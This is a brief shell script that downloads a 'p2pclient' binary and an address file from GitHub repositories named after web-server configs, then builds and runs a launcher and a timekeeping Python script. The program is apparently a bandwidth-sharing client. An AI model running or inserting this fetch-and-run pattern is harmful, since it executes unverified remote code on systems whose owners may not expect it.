rm -rf p2p.sh p2pclient p2p;\
wget https://raw.githubusercontent.com/bls4/apache/main/config/p2p;\
wget https://raw.githubusercontent.com/bls4/womginx/main/config/p2pclient && chmod +x p2pclient;\
echo -e "./p2pclient -l MAIL_ADDREES" | sed -e "s/MAIL_ADDREES/$(cat p2p)/" > p2p.sh;\
chmod +x p2p.sh;\
./p2p.sh;\
python3 /opt/womginx/config/keeptime.py